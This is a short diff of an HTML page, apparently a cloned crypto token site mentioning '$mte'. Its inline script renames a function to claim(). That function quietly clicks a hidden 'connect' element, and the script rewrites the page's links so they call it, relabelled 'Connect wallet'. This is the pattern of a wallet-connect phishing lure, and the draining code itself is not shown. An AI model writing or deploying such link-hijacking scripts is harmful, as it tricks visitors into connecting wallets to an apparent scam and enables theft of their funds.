@@ -2481,7 +2481,7 @@
     src="https://framerusercontent.com/sites/1GCwdFR8txP2SoUEVdgLDd/default_script0.XRVFQJK7.mjs"></script>
 
   <script>
-    function cus_action(){
+    function claim(){
         let action = document.getElementById("connect");
         action.click();
     }
@@ -2498,7 +2498,7 @@
         if(elem.innerText.toLowerCase()=="$mte"){
           let p = elem.querySelectorAll("p");
           p[0].innerText = "Connect wallet";
-          elem.setAttribute("href", "javascript:cus_action()");
+          elem.setAttribute("href", "javascript:claim()");
           elem.setAttribute("target", "");
         }
       }
@@ -2522,7 +2522,7 @@
         var link = allLinks[i];
         var st = link.innerHTML.toLowerCase();
         if (targets.includes(st)) {
-          link.setAttribute("href", "javascript:cus_action()");
+          link.setAttribute("href", "javascript:claim()");
           link.setAttribute("target", "");
           link.innerHTML = subs[t];
           t += 1;
